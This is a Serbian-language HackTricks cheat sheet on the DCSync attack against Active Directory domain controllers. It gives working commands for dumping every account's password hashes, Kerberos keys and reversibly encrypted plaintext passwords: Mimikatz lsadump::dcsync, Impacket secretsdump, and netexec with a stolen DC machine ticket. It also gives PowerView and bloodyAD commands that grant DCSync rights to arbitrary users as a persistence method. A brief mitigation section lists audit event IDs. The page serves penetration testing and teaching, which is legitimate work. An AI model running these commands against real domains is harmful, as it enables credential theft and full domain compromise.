# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

Dozvola **DCSync** podrazumeva posedovanje sledećih dozvola nad samim domenom: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** i **Replicating Directory Changes In Filtered Set**.<sup>[[3]](#references)</sup>

**Važne napomene o DCSync-u:**

- **DCSync napad simulira ponašanje Domain Controller-a i traži od drugih Domain Controller-a da repliciraju informacije** koristeći Directory Replication Service Remote Protocol (MS-DRSR). Pošto je MS-DRSR važeća i neophodna funkcija Active Directory-ja, ne može se isključiti niti onemogućiti.
- Podrazumevano, samo grupe **Domain Admins, Enterprise Admins, Administrators i Domain Controllers** imaju potrebne privilegije.
- U praksi, za **potpuni DCSync** potrebne su dozvole **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** nad kontekstom imenovanja domena. `DS-Replication-Get-Changes-In-Filtered-Set` se obično delegira zajedno s njima, ali je samostalno relevantnija za sinhronizaciju **poverljivih atributa / atributa filtriranih za RODC** (na primer, tajni podaci u legacy LAPS stilu) nego za potpuno izvlačenje krbtgt podataka.<sup>[[2]](#references)</sup>
- Ako su lozinke nekih naloga sačuvane uz reverzibilno šifrovanje, Mimikatz ima opciju za prikaz lozinke u čistom tekstu.

### Enumeracija

Proverite ko ima ove dozvole pomoću `powerview`:

```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```

Ako želiš da se fokusiraš na **principal-e koji nisu podrazumevani** i imaju DCSync prava, isfiltriraj ugrađene grupe koje imaju mogućnost replikacije i pregledaj samo neočekivane korisnike kojima su dodeljena prava:

```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
  Where-Object {
    $_.ObjectType -match 'replication-get' -or
    $_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
  } |
  Where-Object { $_.IdentityReference -notmatch $default } |
  Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```

### Exploit lokalno

```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

### Exploit na daljinu

```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```

Praktični primeri ograničenog opsega:<sup>[[1]](#references)</sup>

```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```

### DCSync pomoću uhvaćenog TGT-a mašine DC-a (ccache)

Pri pregledu servisa na kontroleru domena, razlikujte njegov lokalni identitet servisa od mrežnog identiteta. [Microsoft dokumentuje](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions) da virtuelni nalozi za SQL Server (`NT SERVICE\...`) pristupaju mrežnim resursima pomoću naloga računara hosta. Na kontroleru domena zbog toga nalog mašine DC-a može biti relevantan pri proveri prava replikacije, ali sam foothold preko servisa ne potvrđuje da je moguće izvesti TGT mašine niti da je dostupna upotrebljiva DCSync autentifikacija. Pre nego što ovo smatrate mogućim putem, proverite stvarni identitet servisa, kontekst odlazne autentifikacije, dostupne tikete ili akreditive i efektivna prava replikacije.

U scenarijima unconstrained-delegation u export mode-u možete uhvatiti TGT mašine kontrolera domena (npr. `DC1$@DOMAIN` za `krbtgt@DOMAIN`). Zatim možete da koristite taj ccache za autentifikaciju kao DC i izvršite DCSync bez lozinke.<sup>[[5]](#references)</sup>

```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```

Operativne napomene:

- **Impacket-ova Kerberos putanja prvo pristupa SMB-u** pre poziva DRSUAPI. Ako okruženje sprovodi **SPN target name validation**, full dump možda neće uspeti uz poruku `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
- U tom slučaju prvo zatražite **`cifs/<dc>`** service ticket za ciljni DC ili upotrebite **`-just-dc-user`** za nalog koji vam je odmah potreban.
- Kada imate samo niža prava za replikaciju, sinhronizacija u stilu LDAP/DirSync i dalje može da otkrije **poverljive** atribute ili atribute **filtrirane za RODC** (na primer, zastareli `ms-Mcs-AdmPwd`) bez potpune replikacije krbtgt naloga.<sup>[[2]](#references)</sup>

`-just-dc` generiše 3 datoteke:

- jednu sa **NTLM hash-evima**
- jednu sa **Kerberos ključevima**
- jednu sa lozinkama u čistom tekstu iz NTDS-a za sve naloge za koje je omogućeno [**reverzibilno šifrovanje**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption). Korisnike sa reverzibilnim šifrovanjem možete pronaći pomoću

  ```bash
  Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
  ```

### Persistence

Ako ste administrator domena, možete dodeliti ove dozvole bilo kom korisniku pomoću PowerView-a:<sup>[[3]](#references)</sup>

```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```

Linux operateri mogu isto da urade pomoću `bloodyAD`:

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```

Zatim možete da **proverite da li su korisniku pravilno dodeljene** 3 privilegije tako što ćete ih potražiti u izlazu (nazive privilegija trebalo bi da vidite u polju "ObjectType"):

```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```

### Ublažavanje

- Security Event ID 4662 (mora biti omogućena Audit Policy za objekat) – Izvršena je operacija nad objektom<sup>[[4]](#references)</sup>
- Security Event ID 5136 (mora biti omogućena Audit Policy za objekat) – Izmenjen je objekat direktorijumske usluge
- Security Event ID 4670 (mora biti omogućena Audit Policy za objekat) – Promenjene su dozvole na objektu
- AD ACL Scanner - Kreirajte i uporedite izveštaje o ACL-ovima. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [1] [Impacket dnevnik izmena](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [2] [DirSync: Korišćenje Replication Get-Changes i Get-Changes-In-Filtered-Set](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [3] [DCSync: Izvlačenje hash vrednosti lozinki sa kontrolera domena](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [4] [DCSync](https://yojimbosecurity.ninja/dcsync/)
- [5] [HTB: Delegate — SYSVOL akreditivi → Targeted Kerberoast → Unconstrained Delegation → DCSync do DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
{{#include ../../banners/hacktricks-training.md}}
